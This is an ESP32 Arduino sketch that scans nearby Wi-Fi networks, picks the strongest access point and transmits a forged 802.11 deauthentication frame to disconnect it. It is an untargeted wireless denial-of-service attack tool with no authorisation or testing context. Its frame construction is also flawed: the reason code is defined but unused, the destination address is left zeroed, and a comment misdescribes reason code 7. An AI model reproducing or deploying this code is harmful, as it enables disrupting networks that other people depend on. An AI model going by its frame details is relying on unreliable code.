#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_system.h>

#define DEAUTH_REASON 7  // Reason for deauthentication, 7 is "class 3 frame" (disassociation)

void setup() {
  Serial.begin(115200);
  
  // Initialize Wi-Fi in Station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();  // Disconnect any active connection

  // Initialize Wi-Fi scanning
  esp_wifi_scan_start(NULL, true);  // Start scanning for Wi-Fi networks
  
  // Wait for the scan to complete
  delay(2000);

  // Get the list of networks
  wifi_ap_record_t *scan_results;
  uint16_t network_count = 0;
  esp_wifi_scan_get_ap_records(&network_count, NULL);
  scan_results = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * network_count);
  esp_wifi_scan_get_ap_records(&network_count, scan_results);

  // Find the strongest network (highest RSSI)
  int strongest_network = -1;
  int highest_rssi = -100;  // Arbitrarily low RSSI for comparison

  for (int i = 0; i < network_count; i++) {
    Serial.print("SSID: ");
    Serial.print((char *)scan_results[i].ssid);
    Serial.print(" RSSI: ");
    Serial.println(scan_results[i].rssi);

    if (scan_results[i].rssi > highest_rssi) {
      highest_rssi = scan_results[i].rssi;
      strongest_network = i;
    }
  }

  if (strongest_network != -1) {
    // Found the strongest network, now send deauth
    Serial.println("Sending Deauth Packet to strongest network");
    send_deauth(scan_results[strongest_network].bssid);
  }

  // Clean up
  free(scan_results);

  // Wait and start scanning again
  delay(5000);
}

void loop() {
  // Re-scan networks after deauth
  esp_wifi_scan_start(NULL, true);
  delay(2000);  // Wait for the scan to complete
}

void send_deauth(uint8_t *bssid) {
  // Creating deauth frame
  uint8_t deauth_frame[26] = {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00};  // Deauthentication frame template

  // Fill in the BSSID (MAC address of the target AP)
  for (int i = 0; i < 6; i++) {
    deauth_frame[10 + i] = bssid[i];
    deauth_frame[16 + i] = bssid[i];
  }

  // Sending deauth frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  Serial.println("Deauth packet sent");
}